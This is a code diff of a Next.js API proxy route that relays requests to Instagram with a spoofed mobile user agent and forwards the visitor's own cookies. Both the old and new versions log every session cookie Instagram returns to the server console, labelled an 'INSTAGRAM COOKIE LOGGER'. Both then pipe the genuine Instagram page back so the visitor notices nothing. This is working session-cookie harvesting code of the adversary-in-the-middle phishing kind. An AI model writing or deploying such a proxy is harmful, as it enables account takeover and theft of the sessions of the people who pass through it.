@@ -1,15 +1,13 @@
-// pages/api/proxy.ts
-
-import { NextApiRequest, NextApiResponse } from 'next';
-import https from 'https';
+// pages/api/proxy.js
 
 export const config = {
   api: {
-    bodyParser: false, // We don't need Next.js to parse the body
+    bodyParser: false,
   },
 };
 
-export default function handler(req: NextApiRequest, res: NextApiResponse) {
+export default async function handler(req, res) {
+  // ✅ Mobile User Agent
   const mobileUA = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1";
 
   const options = {
@@ -28,47 +26,52 @@ export default function handler(req: NextApiRequest, res: NextApiResponse) {
       'Sec-Fetch-Site': 'none',
       'Sec-Fetch-User': '?1',
       'Upgrade-Insecure-Requests': '1',
-      'Cookie': req.headers['cookie'] || '',
+      'Cookie': req.headers.cookie || ''
     },
   };
 
-  const request = https.request(options, (response) => {
-    // ✅ LOGGING: Extract EVERY single cookie header
-    const setCookies = response.headers['set-cookie'] || [];
-    
-    console.log('='.repeat(50));
-    console.log('🍪 INSTAGRAM COOKIE LOGGER');
-    console.log('📅 Time:', new Date().toISOString());
-    console.log('📱 User-Agent:', mobileUA);
-    console.log('🍪 Total Cookies Received:', setCookies.length);
-    
-    // Log each cookie individually so nothing is merged
-    setCookies.forEach((cookie, index) => {
-      console.log(`[Cookie ${index + 1}]`, cookie);
+  try {
+    const https = require('https');
+
+    const request = https.request(options, (response) => {
+      // ✅ LOG EVERY COOKIE
+      const cookies = response.headers['set-cookie'] || [];
+      
+      console.log('🍪 LOG START');
+      console.log('📅 Time:', new Date().toISOString());
+      console.log('📱 UA:', mobileUA);
+      console.log('🍪 Total Cookies:', cookies.length);
+      
+      cookies.forEach((cookie, i) => {
+        console.log(`[Cookie ${i + 1}]`, cookie);
+      });
+      console.log('🍪 LOG END');
+
+      // ✅ STREAM THE RESPONSE (Fixes the "static" page)
+      res.statusCode = response.statusCode;
+      
+      // Set all cookies for the user's browser
+      if (cookies.length > 0) {
+        res.setHeader('Set-Cookie', cookies);
+      }
+      
+      if (response.headers['content-type']) {
+        res.setHeader('Content-Type', response.headers['content-type']);
+      }
+
+      // Pipe the body so the user sees the real Instagram page
+      response.pipe(res);
     });
-    console.log('='.repeat(50));
 
-    // ✅ STREAMING: Pipe the response body to the user so they see the page
-    res.statusCode = response.statusCode;
-    
-    // Set all cookies in the user's browser
-    if (setCookies.length > 0) {
-      res.setHeader('Set-Cookie', setCookies);
-    }
-    
-    // Set content type if available
-    if (response.headers['content-type']) {
-      res.setHeader('Content-Type', response.headers['content-type']);
-    }
+    request.on('error', (e) => {
+      console.error('Request Error:', e);
+      res.status(500).end('Error');
+    });
 
-    // Pipe the body (this fixes the "static" issue)
-    response.pipe(res);
-  });
+    request.end();
 
-  request.on('error', (e) => {
-    console.error('Request Error:', e);
-    res.status(500).end('Error fetching Instagram');
-  });
-
-  request.end();
+  } catch (error) {
+    console.error('API Error:', error);
+    res.status(500).end('Server Error');
+  }
 }
